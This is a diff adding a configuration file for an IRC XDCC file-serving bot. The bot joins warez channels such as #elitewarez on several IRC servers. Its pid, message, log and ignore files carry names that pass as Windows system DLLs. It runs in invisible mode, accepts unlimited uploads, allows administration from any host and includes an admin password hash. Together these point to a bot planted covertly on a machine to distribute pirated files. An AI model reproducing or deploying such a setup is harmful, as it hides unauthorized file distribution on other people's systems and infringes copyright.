@@ -1,0 +1,88 @@
+xdccfile .\wins32.dll 
+pidfile .\xx32.dll 
+#logfile .\IGNOo32.dll 
+logstats no 
+logrotate weekly 
+messagefile .\msgs32.dll 
+ignorefile .\ignor32.dll 
+connectionmethod direct 
+server irc.intrac.net 6667 
+server irc.fastirc.net 6667 
+server irc.intrac.net 6667 
+server irc.fastirc.net 6667 
+server irc.intrac.net 6666 
+server irc.fastirc.net 6667 
+server irc.intrac.net 6667 
+server irc.fastirc.net 7000 
+server irc.intrac.net 6666 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.fastirc.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server irc.intrac.net 6667 
+server irc.intrac.net 7000 
+server 64.246.23.248 6667 
+server 64.246.23.248 6667 
+server 64.246.23.248 6667 
+server 64.246.23.248 6667 
+server 64.246.23.248 7000 
+server 64.246.23.248 6665 
+server 64.246.23.248 6666 
+server 64.246.23.248 6667 
+server 64.246.23.248 6668 
+server 64.246.23.248 7000 
+server 64.246.23.248 6665 
+server 64.246.23.248 6666 
+server 64.246.23.248 6667 
+server 64.246.23.248 6668 
+server 64.246.23.248 7000 
+channel #elitewarez -plist 32 -pformat full 
+channel #ewg 
+channel #CjB 
+user_realname Runty Kunty Sun Of Stunty STFU!
+user_modes +i 
+loginname EWG 
+slotsmax 10 
+queuesize 5 
+slotsmaxpack 10 
+slotsmaxslots 10 
+slotsmaxqueue 5 
+maxtransfersperperson 2 
+maxqueueditemsperperson 2 
+filedir ..\dll 
+restrictlist yes 
+restrictsend yes 
+lowbdwth 0 
+overallminspeed 0.0 
+transfermaxspeed 3000.0 
+overallmaxspeed 0 
+overallmaxspeeddayspeed 0 
+overallmaxspeeddaytime 9 17 
+overallmaxspeeddaydays MTWRF 
+debug no 
+autosend no 
+autoword blah 
+automsg blah 
+autopack 1 
+xdccautosavetime 30 
+creditline 15,1*14[15EWG14]15* 14MmM. Sexuals? OMG Myyyyyyy Brakes! ;/ 15*14[15EWG14]15* 
+adminpass JpcHXjZfyeyyc 
+adminhost *!*@* 
+uploadallowed yes 
+uploaddir ..\dll 
+uploadmaxsize 0 
